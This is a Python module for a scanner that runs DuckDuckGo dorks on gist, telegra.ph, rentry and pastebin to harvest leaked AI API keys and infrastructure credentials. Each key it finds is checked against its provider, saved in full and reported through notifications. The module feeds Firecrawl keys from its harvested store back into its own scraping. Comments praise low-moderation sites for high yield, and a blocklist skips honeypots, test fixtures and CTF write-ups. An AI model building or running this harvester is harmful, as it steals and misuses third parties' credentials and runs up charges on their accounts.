"""
Generic web-dork scanner — hunts secrets across paste/share platforms via
DuckDuckGo HTML search + direct HTTP fetch + regex extractors.

Why DDG HTML instead of Firecrawl /v1/search (old approach):
  - Firecrawl SERP returned bit-for-bit identical results every cycle (cached)
  - 6 cycles × ~600 API calls → 0 valid keys (confirmed 2026-05-07)
  - DDG HTML (html.duckduckgo.com/html/) returns fresh SERP, no API key needed,
    no credits burned, polite 1.5 s inter-query sleep is fine

New platforms (replace rentry/gitlab/SO/pastebin-via-firecrawl):
  gist        — gist.github.com  (keyword search catches OLD gists that the
                                   feed-based gist_scanner missed; no dupe with
                                   /gists/public feed since DDG surfaces by rank)
  telegra_ph  — telegra.ph       (Telegram/RU developer walkthroughs, very low
                                   moderation, AI tutorial authors paste full configs)
  rentry      — rentry.co        (confirmed live keys in first firecrawl cycle;
                                   broken only because firecrawl SERP was caching)
  pastebin    — pastebin.com     (classic .env dump site)

Content retrieval:
  Phase 1 — scan DDG snippet (often has the key fragment already)
  Phase 2 — direct HTTP GET of the page URL → scan raw text
  Phase 3 — if direct GET fails or page requires JS: firecrawl /v1/scrape
             as last resort (scrape not search, avoids the caching problem)

PROVIDER_TOKENS — trimmed to 30 most distinctive; avoids common words that
flood DDG results with false positives. Cycle time ≈ 12-18 min (vs 40-107 min).
"""

from __future__ import annotations

import asyncio
import hashlib
import logging
import os
import random
import re
import urllib.parse
from datetime import datetime, timezone

import httpx

import db
from patterns import EXTRACTORS, AI_TRIGGER, INFRA_TRIGGER
from infra_patterns import INFRA_EXTRACTORS, extract_destination, assess_risk
from deobfuscate import expand as _deobf_expand
from validators import validate
from notifier import notify_found, notify_infra_found

log = logging.getLogger(__name__)

WEB_DORK_SCAN_INTERVAL = int(os.environ.get("WEB_DORK_SCAN_INTERVAL", "3600"))  # 60 min
WEB_DORK_RESULTS_PER_QUERY = int(os.environ.get("WEB_DORK_RESULTS_PER_QUERY", "10"))
WEB_DORK_INTER_QUERY_SLEEP = float(os.environ.get("WEB_DORK_INTER_QUERY_SLEEP", "5.0"))  # was 1.5s — DDG blocked at 135 dorks × 1.5s

_DDG_SEARCH = "https://html.duckduckgo.com/html/"
_FIRECRAWL_SCRAPE = "https://api.firecrawl.dev/v1/scrape"
_LIMITS = httpx.Limits(max_connections=10, max_keepalive_connections=4, keepalive_expiry=20)

_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"


# ── Provider tokens — 10 highest-ROI for paste surfaces ─────────────────────
# Trimmed 30 → 10 after first DDG cycle blocked at 134/135 dorks (2026-05-07).
# Picked: literal prefixes (catch raw dumps without var name) + CN env-vars
# (low moderation on paste sites, high yield) + 2 most-leaked global vars.
# 10 tokens × 4 platforms = 40 dorks + ~10 platform extras = ~50 total.

PROVIDER_TOKENS = [
    # Literal key prefixes — gold (no false-positive prone words)
    "sk-proj-",   # OpenAI project keys
    "sk-ant-",    # Anthropic
    "AIzaSy",     # Google
    # CN providers — low moderation on RU/CN paste sites, high yield
    "ZHIPUAI_API_KEY",
    "ARK_API_KEY",
    "MOONSHOT_API_KEY",
    "KLING_ACCESS_KEY",
    "SILICONFLOW_API_KEY",
    # Global env-vars — most-leaked
    "DEEPSEEK_API_KEY",
    "ANTHROPIC_API_KEY",
]


# ── URL blocklist ─────────────────────────────────────────────────────────────
_URL_BLOCKLIST = (
    "gitlab-org/security-products/analyzers/secrets",
    "trufflesecurity/trufflehog/blob/main/pkg/detectors",
    "gitleaks/gitleaks/blob",
    "Yelp/detect-secrets/blob",
    "/blob/main/test_data/", "/blob/master/test_data/",
    "/-/blob/main/test/", "/-/blob/master/test/",
    "/fixtures/", "/testdata/",
    "honeypot", "ctf-writeups",
    "juice-shop/juice-shop", "bWAPP",
    "example.com", "placeholder",
)


def _is_blocked_url(url: str) -> bool:
    if not url:
        return True
    u = url.lower()
    return any(b.lower() in u for b in _URL_BLOCKLIST)


# ── Platforms ────────────────────────────────────────────────────────────────
# Each platform: site for DDG `site:` operator + file_type label + extra dorks.

PLATFORMS = [
    {
        "name":      "gist",
        "site":      "gist.github.com",
        "file_type": "gist_dork",
        # Gists older than ~1 week aren't in feed-scanner; DDG surfaces by rank
        "extra":     [".env", "api_key config"],
    },
    {
        "name":      "telegra_ph",
        "site":      "telegra.ph",
        "file_type": "telegraph",
        # RU/CN devs paste full AI tutorial configs here, minimal moderation
        "extra":     ["api tutorial", ".env config"],
    },
    {
        "name":      "rentry",
        "site":      "rentry.co",
        "file_type": "rentry",
        # Confirmed live keys in first web_dork cycle (2026-05-06 18:39)
        "extra":     [".env", "API_KEY", "chatbot config"],
    },
    {
        "name":      "pastebin",
        "site":      "pastebin.com",
        "file_type": "pastebin",
        "extra":     [".env dump", "api_key", "config secrets"],
    },
]


def _build_dorks() -> list[tuple[str, dict]]:
    dorks = []
    for plat in PLATFORMS:
        site = plat["site"]
        for tok in PROVIDER_TOKENS:
            dorks.append((f"site:{site} {tok}", plat))
        for extra in plat.get("extra", []):
            dorks.append((f"site:{site} {extra}", plat))
    return dorks


_DORKS = _build_dorks()


# ── Firecrawl key pool (scrape-only fallback) ─────────────────────────────────

def _firecrawl_keys() -> list[str]:
    rows = db.get_valid_keys_by_provider("firecrawl")
    keys = [r["key_full"] for r in rows]
    random.shuffle(keys)
    return keys


def _mark_dead(provider: str, key: str):
    h = hashlib.sha256(key.encode()).hexdigest()
    try:
        db.update_key_validity(h, False)
        log.warning("[web_dork] marked %s key dead: %s", provider, key[:14])
    except Exception:
        pass


# ── DDG HTML search ───────────────────────────────────────────────────────────

def _parse_ddg_urls(html: str) -> list[str]:
    """Extract result URLs from DDG HTML page."""
    urls: list[str] = []
    # DDG HTML redirects: href="//duckduckgo.com/l/?uddg=URL_ENCODED&rut=..."
    for m in re.finditer(r'uddg=(https?%3A%2F%2F[^&"<>\s]+)', html):
        decoded = urllib.parse.unquote(m.group(1))
        urls.append(decoded)
    # Newer DDG format: direct href on result links (no redirect)
    for m in re.finditer(r'<a[^>]+class="[^"]*result__a[^"]*"[^>]+href="(https?://[^"]+)"', html):
        u = m.group(1)
        if "duckduckgo.com" not in u:
            urls.append(u)
    # Deduplicate while preserving order
    seen: set[str] = set()
    out: list[str] = []
    for u in urls:
        if u not in seen:
            seen.add(u)
            out.append(u)
    return out


async def _ddg_search(client: httpx.AsyncClient, query: str) -> list[dict]:
    """DuckDuckGo HTML scrape → list of {url, snippet} dicts. No API key."""
    try:
        r = await client.get(
            _DDG_SEARCH,
            params={"q": query, "ia": "web", "kl": "us-en"},
            headers={"User-Agent": _UA, "Accept-Language": "en-US,en;q=0.9"},
            timeout=20,
            follow_redirects=True,
        )
        if r.status_code != 200:
            log.debug("[web_dork] DDG %d for %r", r.status_code, query[:60])
            return []
        html = r.text
        urls = _parse_ddg_urls(html)
        if not urls:
            log.debug("[web_dork] DDG 0 urls parsed for %r (body=%d chars)",
                      query[:60], len(html))
            return []
        # Grab snippet text for phase-1 scan: extract <a class="result__snippet">
        snippets: dict[str, str] = {}
        for m in re.finditer(
            r'<a[^>]+class="[^"]*result__snippet[^"]*"[^>]*>(.*?)</a>',
            html, re.DOTALL
        ):
            raw_snip = re.sub(r'<[^>]+>', '', m.group(1)).strip()
            # Try to associate snippet with nearest URL (approx — DDG order)
            if len(snippets) < len(urls):
                snippets[urls[len(snippets)]] = raw_snip
        return [{"url": u, "snippet": snippets.get(u, "")} for u in urls]
    except Exception as e:
        log.debug("[web_dork] DDG error for %r: %s", query[:60], e)
        return []


# ── Content fetch ─────────────────────────────────────────────────────────────

async def _direct_fetch(client: httpx.AsyncClient, url: str) -> str | None:
    """Raw HTTP GET — works for rentry, telegra.ph, pastebin raw, gist raw."""
    # Normalise to raw/plain-text endpoints when possible
    raw_url = url
    if "pastebin.com/" in url and "/raw/" not in url:
        # pastebin.com/XXXXX → pastebin.com/raw/XXXXX
        raw_url = url.replace("pastebin.com/", "pastebin.com/raw/", 1)
    elif "gist.github.com/" in url and "/raw" not in url:
        # gist.github.com/user/hash → gist.github.com/user/hash/raw (redirects to raw)
        raw_url = url.rstrip("/") + "/raw"

    for attempt_url in [raw_url, url] if raw_url != url else [url]:
        try:
            r = await client.get(
                attempt_url,
                timeout=15,
                follow_redirects=True,
                headers={"User-Agent": _UA},
            )
            if r.status_code == 200 and r.text:
                return r.text
        except Exception:
            pass
    return None


async def _firecrawl_fetch(client: httpx.AsyncClient, url: str,
                           keys: list[str]) -> str | None:
    """Firecrawl /v1/scrape — last-resort fallback for JS-rendered pages."""
    for key in keys[:2]:
        try:
            r = await client.post(
                _FIRECRAWL_SCRAPE,
                headers={"Authorization": f"Bearer {key}",
                         "Content-Type": "application/json"},
                json={"url": url, "formats": ["markdown"]},
                timeout=30,
            )
            if r.status_code in (401, 402, 403):
                _mark_dead("firecrawl", key)
                continue
            if r.status_code != 200:
                continue
            md = (r.json().get("data") or {}).get("markdown") or ""
            return md or None
        except Exception:
            pass
    return None


# ── Content scanning ──────────────────────────────────────────────────────────

async def _scan_text(text: str, url: str, file_type: str) -> tuple[int, int]:
    """AI + infra extractors. Returns (ai_keys_saved, valid_saved)."""
    if not text:
        return 0, 0
    text = _deobf_expand(text)
    has_ai    = any(t in text for t in AI_TRIGGER)
    has_infra = any(t in text for t in INFRA_TRIGGER)
    if not has_ai and not has_infra:
        return 0, 0

    repo_label = url[:200]
    ks_total = vs_total = 0

    if has_ai:
        for prov, fn in EXTRACTORS.items():
            for key in fn(text):
                if db.key_exists(key):
                    continue
                try:
                    is_valid = await validate(prov, key)
                except Exception:
                    is_valid = False
                saved = db.save_key(
                    prov, key, repo_label, "web-dork-page", url,
                    0, "", file_type, is_valid,
                )
                if saved:
                    ks_total += 1
                    if is_valid:
                        vs_total += 1
                    try:
                        await notify_found(prov, key, repo_label, "web-dork-page",
                                           url, 0, "", file_type, is_valid)
                    except Exception:
                        pass
                    log.info("[%s %s] %s from %s", file_type,
                             "VALID" if is_valid else "found", prov, url[:80])

    if has_infra:
        risk_cache = None
        for iprov, ifn in INFRA_EXTRACTORS.items():
            try:
                creds = ifn(text)
            except Exception:
                continue
            if not creds:
                continue
            if risk_cache is None:
                risk_cache = assess_risk(text, "web-dork-page", 0, "")
            risk_level, risk_reasons = risk_cache
            for cred in creds:
                if db.infra_exists(cred):
                    continue
                destination = extract_destination(cred) if "://" in cred else ""
                saved = db.save_infra(
                    iprov, cred, repo_label, "web-dork-page", url,
                    0, "", file_type, destination, risk_level, risk_reasons,
                )
                if saved:
                    try:
                        await notify_infra_found(iprov, cred, repo_label,
                                                 "web-dork-page", url, 0, "",
                                                 file_type, destination,
                                                 risk_level, risk_reasons)
                    except Exception:
                        pass
                    log.info("[%s infra/%s] %s from %s", file_type, iprov,
                             destination[:60] or cred[:30], url[:80])

    return ks_total, vs_total


# ── Per-dork worker ───────────────────────────────────────────────────────────

async def _process_dork(client: httpx.AsyncClient, query: str, plat: dict,
                        fc_keys: list[str]) -> dict:
    file_type = plat["file_type"]
    site = plat["site"]

    results = await _ddg_search(client, query)
    if not results:
        return {"results": 0, "ai_saved": 0, "valid_saved": 0, "fetched": 0}

    ai_saved = valid_saved = fetched = 0

    for r in results:
        url = r.get("url", "")
        if not url or site not in url:
            continue
        if _is_blocked_url(url):
            log.debug("[web_dork] skip blocklisted: %s", url[:120])
            continue

        snippet = (r.get("snippet") or "")

        # Phase 1: snippet scan
        ks, vs = await _scan_text(snippet, url, file_type)
        ai_saved += ks
        valid_saved += vs

        # Phase 2: direct fetch
        snippet_trigger = (any(t in snippet for t in AI_TRIGGER)
                           or any(t in snippet for t in INFRA_TRIGGER))
        full: str | None = None
        try:
            full = await _direct_fetch(client, url)
        except Exception:
            pass

        if full:
            fetched += 1
            ks2, vs2 = await _scan_text(full, url, file_type)
            ai_saved += ks2
            valid_saved += vs2
        elif snippet_trigger and ks == 0 and fc_keys:
            # Phase 3: firecrawl scrape fallback (only when snippet had trigger
            # but direct fetch failed — e.g. JS-rendered paste preview)
            fc_full = await _firecrawl_fetch(client, url, fc_keys)
            if fc_full:
                fetched += 1
                ks3, vs3 = await _scan_text(fc_full, url, file_type)
                ai_saved += ks3
                valid_saved += vs3

    return {"results": len(results), "ai_saved": ai_saved,
            "valid_saved": valid_saved, "fetched": fetched}


# ── Cycle ─────────────────────────────────────────────────────────────────────

async def run_web_dork_cycle():
    fc_keys = _firecrawl_keys()  # scrape fallback only — not for SERP

    log.info("=== web_dork cycle start | DDG search | %d dorks across "
             "%d platforms ===", len(_DORKS), len(PLATFORMS))

    cycle_results = cycle_ai = cycle_valid = cycle_fetched = 0
    per_platform: dict[str, dict] = {p["name"]: {"r": 0, "v": 0} for p in PLATFORMS}
    ddg_zeros = 0  # count of dorks that DDG returned 0 results — detect block

    async with httpx.AsyncClient(follow_redirects=True, limits=_LIMITS) as client:
        for query, plat in _DORKS:
            try:
                stats = await _process_dork(client, query, plat, fc_keys)
                cycle_results += stats["results"]
                cycle_ai      += stats["ai_saved"]
                cycle_valid   += stats["valid_saved"]
                cycle_fetched += stats["fetched"]
                per_platform[plat["name"]]["r"] += stats["results"]
                per_platform[plat["name"]]["v"] += stats["valid_saved"]
                if stats["results"] == 0:
                    ddg_zeros += 1
                if stats["valid_saved"] > 0:
                    log.info("[web_dork %s] %r → %d results, %d valid",
                             plat["name"], query[:60], stats["results"],
                             stats["valid_saved"])
            except Exception as e:
                log.warning("[web_dork dork failed] %r: %s", query[:60], e)
            # Inter-query sleep — DDG blocked at 1.5s × 135 dorks; 5s × 50 dorks fits
            await asyncio.sleep(WEB_DORK_INTER_QUERY_SLEEP)

    if ddg_zeros > len(_DORKS) * 0.8:
        log.warning("[web_dork] DDG may be blocking — %d/%d dorks returned 0 results",
                    ddg_zeros, len(_DORKS))

    plat_summary = ", ".join(f'{p}={s["r"]}r/{s["v"]}v'
                             for p, s in per_platform.items())
    log.info("=== web_dork cycle done | %d total results | %d ai_keys (%d valid) "
             "| %d fetches | per-platform: %s ===",
             cycle_results, cycle_ai, cycle_valid, cycle_fetched, plat_summary)


async def web_dork_loop():
    log.info("web_dork scanner started | DDG HTML | interval=%ds | %d platforms | %d dorks",
             WEB_DORK_SCAN_INTERVAL, len(PLATFORMS), len(_DORKS))
    await asyncio.sleep(90)  # boot delay — let other scanners start first
    while True:
        try:
            await run_web_dork_cycle()
        except Exception as e:
            log.error("web_dork cycle crashed: %s", e)
        log.info("web_dork sleeping %ds until next cycle", WEB_DORK_SCAN_INTERVAL)
        await asyncio.sleep(WEB_DORK_SCAN_INTERVAL)
